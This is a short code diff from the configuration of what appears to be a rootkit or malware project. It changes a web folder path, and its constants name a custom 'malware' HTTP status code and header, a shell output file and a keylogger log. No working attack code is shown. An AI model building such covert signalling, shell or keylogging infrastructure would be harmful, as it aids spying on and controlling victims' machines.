@@ -4,7 +4,7 @@ import time
 
 MALWARE_STATUS_CODE = 200  # Change this to 666
 MALWARE_HEADER_RESPONSE = 'Content-Encoding'  # Change this to malware-response
-WEB_FOLDER = "/home/shahart/colman_rootkit"
+WEB_FOLDER = "/var/web"
 OUTPUT_SHELL_FILENAME = "output"
 OUTPUT_KL_FILENAME = "klog.log"
 
